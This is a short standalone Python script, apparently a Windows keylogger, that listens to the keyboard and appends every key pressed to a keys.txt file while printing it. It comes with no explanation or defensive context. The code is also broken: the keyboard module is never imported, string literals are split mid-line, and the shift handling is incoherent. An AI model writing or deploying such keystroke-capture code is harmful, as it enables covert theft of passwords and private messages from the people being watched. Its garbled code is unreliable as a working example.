```python

import os
import ctypes

user32 = ctypes.windll.user32
shiftState = 0

# File path
filepath = os.getcwd() + "\\keys.txt"

def on_press(key):
    global shiftState
    vkCode = key.vk
    if vkCode == 160 or vkCode == 161:
        shiftState |= key.vk
    with open(filepath, 'a') as f:
        try:
            f.write('{}
'.format(user32.MapVirtualKeyA(key.vk, 0)))
            print('Key {} pressed'.format(user32.MapVirtualKeyA(key.vk, 0)))
        except AttributeError:
            f.write('{}
'.format(str(key)))
            print('Special key {} pressed'.format(str(key)))

def on_release(key):
    global shiftState
    if key == keyboard.Key.shift or key == keyboard.Key.shift_r:
        shiftState = 0
    elif key.vk == 160 or key.vk == 161:
        shiftState &= ~key.vk

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
```